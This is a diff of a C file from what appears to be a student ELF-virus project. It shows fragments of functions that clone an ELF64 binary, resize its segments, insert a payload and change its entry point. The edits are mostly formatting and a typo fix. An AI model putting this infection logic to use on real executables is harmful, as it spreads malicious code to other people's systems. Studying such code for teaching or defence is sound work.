@@ -6,11 +6,12 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/06 04:53:36 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 02:26:23 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "infect.h"
+#include "errors.h"
 
 static bool	change_entry(const struct safe_pointer info,
 	const struct endians_pointer endians,
@@ -18,7 +19,7 @@ static bool	change_entry(const struct safe_pointer info,
 {
 	Elf64_Ehdr	*clone_hdr = safe(0, sizeof(Elf64_Ehdr));
 
-	if (!clone_hdr)  return (errors(ERR_CORRUPT, "wildly unreasonable"));
+	if (!clone_hdr)  return errors(ERR_CORRUPT, "wildly unreasonable");
 
 	const Elf64_Xword	sh_offset         = endians.endian_8(original_entry->safe_shdr->sh_offset);
 	const size_t		offset_in_section = original_entry->offset_in_section;
@@ -40,8 +41,8 @@ static bool	adjust_sizes(const struct endians_pointer endians,
 	struct entry	clone_entry;
 	const size_t	payload_size = end_payload - begin_payload;
 
-	if (!find_entry(&clone_entry, info, endians))
-      return errors(ERR_THROW, "adjust_sizes");
+	if (!find_entry(&clone_entry, info, endians)) return errors(ERR_THROW, "adjust_sizes");
+
 	size_t		sh_size  = endians.endian_8(clone_entry.safe_last_section_shdr->sh_size);
 	Elf64_Xword	p_filesz = endians.endian_8(clone_entry.safe_phdr->p_filesz);
 	Elf64_Xword	p_memsz  = endians.endian_8(clone_entry.safe_phdr->p_memsz);
@@ -82,7 +83,7 @@ static bool	define_shift_amount(const struct endians_pointer endians,
       "in file (overflow of %lu bytes)", (end_padding - p_align));
 }
 
-boor		elf64_packer(const struct famine food, size_t original_file_size)
+bool		elf64_packer(const struct famine food, size_t original_file_size)
 {
 	struct entry	original_entry;
 	size_t		shift_amount;
@@ -94,7 +95,7 @@ boor		elf64_packer(const struct famine food, size_t original_file_size)
 	|| !adjust_sizes(food.endians, food.clone_safe, shift_amount)
 	|| !setup_payload(&original_entry, food.endians, food.clone_safe)
 	|| !change_entry(food.clone_safe, food.endians, &original_entry))
-   return errors(ERR_THROW, "elf64_packer");
+		return errors(ERR_THROW, "elf64_packer");
 
 	return true;
 }
